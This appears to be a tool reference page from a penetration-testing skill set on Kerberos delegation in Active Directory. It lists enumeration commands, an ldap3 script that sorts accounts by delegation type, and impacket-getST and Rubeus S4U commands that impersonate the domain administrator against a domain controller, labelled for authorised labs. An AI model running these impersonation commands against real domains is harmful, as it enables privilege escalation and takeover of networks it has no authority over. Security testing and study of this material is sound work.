# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`active-directory-kerberos-attacks-delegation`](SKILL.md) | Family: **Network, Active Directory and Endpoint**

Entry points verified against current releases. Impacket, Certipy and netexec rename subcommands between minor versions; check `--help` before scripting.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `impacket-findDelegation` | `impacket-findDelegation corp.example/lowpriv:pass -dc-ip 10.20.30.10` | Delegation inventory across all forms | Linux / Windows |
| `Get-ADComputer` | `Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties *` | Unconstrained delegation hosts | Windows |
| `PowerView` | `Get-DomainComputer -Unconstrained &#124; Select-Object name,dnshostname` | Unconstrained hosts with resolved context | Windows |
| `impacket-getST` | `impacket-getST -spn cifs/dc01 -impersonate administrator corp/lowpriv:pass` | S4U chain against an authorised lab target | Linux / Windows |
| `Rubeus` | `Rubeus.exe s4u /user:WEB01$ /impersonateuser:administrator /msdsspn:cifs/dc01` | S4U from a Windows host, lab only | Windows |

## Minimal Lab Validation Script

Classify each account into exactly one delegation form and print the controlling attribute, so the branch is explicit.

```python
from ldap3 import Server, Connection, NTLM

UNCONSTRAINED = 0x80000
NOT_DELEGATED = 0x100000
srv = Server("10.20.30.10")
conn = Connection(srv, user="CORP\\lowpriv", password="pass", authentication=NTLM, auto_bind=True)
conn.search("DC=corp,DC=example", "(|(objectClass=computer)(objectClass=user))",
            attributes=["sAMAccountName", "userAccountControl",
                        "msDS-AllowedToDelegateTo",
                        "msDS-AllowedToActOnBehalfOfOtherIdentity"])
for e in conn.entries:
    uac = int(e.userAccountControl.value or 0)
    if uac & NOT_DELEGATED:
        continue
    if uac & UNCONSTRAINED:
        print(e.sAMAccountName, "unconstrained")
    elif e.msDS_AllowedToDelegateTo:
        print(e.sAMAccountName, "constrained", e.msDS_AllowedToDelegateTo.value)
    elif e.msDS_AllowedToActOnBehalfOfOtherIdentity.value:
        print(e.sAMAccountName, "rbcd")
```

## Flag Notes

- `-dc-ip` pins the KDC so results are not split across sites during collection.
- `-impersonate` names the identity to assert; in an authorised lab this proves the path, outside it is out of scope.
- `-Properties *` is required for `msDS-AllowedToDelegateTo`, which is not in the default property set.
